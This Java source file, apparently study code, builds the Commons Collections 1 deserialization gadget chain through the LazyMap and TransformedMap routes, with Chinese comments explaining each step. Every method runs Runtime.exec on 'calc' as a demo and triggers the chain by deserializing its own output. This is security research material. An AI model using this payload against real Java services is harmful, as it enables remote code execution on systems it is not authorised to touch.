package com.outlaws.cc;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.LazyMap;
import org.apache.commons.collections.map.TransformedMap;

import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.annotation.Retention;
import java.lang.reflect.Constructor;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Proxy;
import java.util.HashMap;
import java.util.Map;

/**
 * @auther : outlaws
 * @date : 2022/7/3 16:55
 * @use :
 */

public class CommonCollections1 {

    public static void main(String[] args) throws Exception {
        getRCEByLazyMap();
    }

    public static void getRCEByLazyMap() throws Exception {

        // 生成序列化流，在8u71前有效
        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", new Class[0]}),
                new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, new Object[0]}),
                new InvokerTransformer("exec", new Class[]{String.class}, new String[]{"calc.exe"}),
                new ConstantTransformer(1)
        };
        Transformer transformerChain = new ChainedTransformer(transformers);
        Map<?, ?> innerMap = new HashMap<>();
        Map<?, ?> outerMap = LazyMap.decorate(innerMap, transformerChain);

        Class<?> clazz = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor<?> construct = clazz.getDeclaredConstructor(Class.class, Map.class);
        construct.setAccessible(true);

        InvocationHandler handler = (InvocationHandler) construct.newInstance(Retention.class, outerMap);
        Map<?, ?> proxyMap = (Map<?, ?>) Proxy.newProxyInstance(Map.class.getClassLoader(), new Class[]{Map.class}, handler);
        handler = (InvocationHandler) construct.newInstance(Retention.class, proxyMap);

        ByteArrayOutputStream barr = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(barr);
        oos.writeObject(handler);
        oos.close();
//        System.out.println(barr);
        ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(barr.toByteArray()));
        ois.readObject();

    }

    public static void getRCEByTransformedMap() throws Exception {

        // 生成序列化流，在8u71前有效

        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", new Class[]{}}),
                new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, new Object[]{}}),
                new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc"})
        };
        Transformer transformerChain = new ChainedTransformer(transformers);
        HashMap<Object, Object> innerMap = new HashMap<Object, Object>();
        innerMap.put("value", "xxx");
        Map<?, ?> outerMap = TransformedMap.decorate(innerMap, null, transformerChain);
        Class<?> clazz = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor<?> construct = clazz.getDeclaredConstructor(Class.class, Map.class);
        construct.setAccessible(true);

        Object obj = construct.newInstance(Retention.class, outerMap);

        ByteArrayOutputStream barr = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(barr);
        oos.writeObject(obj);
        oos.close();

//        System.out.println(new String(Base64.getEncoder().encode(barr.toByteArray())));
        ObjectInputStream objectInputStream = new ObjectInputStream(new ByteArrayInputStream(barr.toByteArray()));
        objectInputStream.readObject();
    }

    public static void localRCE() throws Exception {
        // localRCE Demo
        Transformer[] transformers = new Transformer[]{
                // 实例化runtime类
                new ConstantTransformer(Runtime.getRuntime()),
                // 执行exec方法
                new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc"}),
        };
        // ChainedTransformer也是实现了Transformer接⼝的⼀个类，它的作⽤是将内部的多个Transformer串在⼀起。通俗来说就是，前⼀个回调返回的结果，作为后⼀个回调的参数传⼊
        Transformer transformerChain = new ChainedTransformer(transformers);
        HashMap<Object, Object> innerMap = new HashMap<Object, Object>();
//        TransformedMap⽤于对Java标准数据结构Map做⼀个修饰，被修饰过的Map在添加新的元素时，将可
//        以执⾏⼀个回调。我们通过下⾯这⾏代码对innerMap进⾏修饰，传出的outerMap即是修饰后的Map：
//          Map outerMap = TransformedMap.decorate(innerMap, keyTransformer,valueTransformer);
//        其中，keyTransformer是处理新元素的Key的回调，valueTransformer是处理新元素的value的回调。
//        我们这⾥所说的”回调“，并不是传统意义上的⼀个回调函数，⽽是⼀个实现了Transformer接⼝的类。
        Map outerMap = TransformedMap.decorate(innerMap, null, transformerChain);
        outerMap.put("test", "xxxx");
    }

}
